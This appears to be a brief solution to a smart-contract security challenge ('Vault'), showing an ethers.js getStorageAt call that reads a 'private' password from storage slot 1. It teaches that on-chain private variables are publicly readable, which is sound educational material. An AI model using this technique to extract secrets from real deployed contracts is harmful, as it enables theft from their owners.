# Solution

Any private smart contract storage variable can be read off-chain. To do this, you can use ethers.js [provider.getStorageAt(address, position)](https://docs.ethers.org/v5/api/providers/provider/#Provider-getStorageAt) function.

The variable `password` is at the slot position 1. Use the following call to read the password from the Vault smart contract storage:
```solidity
  const storagePassword = await ethers.provider.getStorageAt(
    vault.address,
    1,
  );
```

See test cases in `test/Vault.exploit.test.ts`
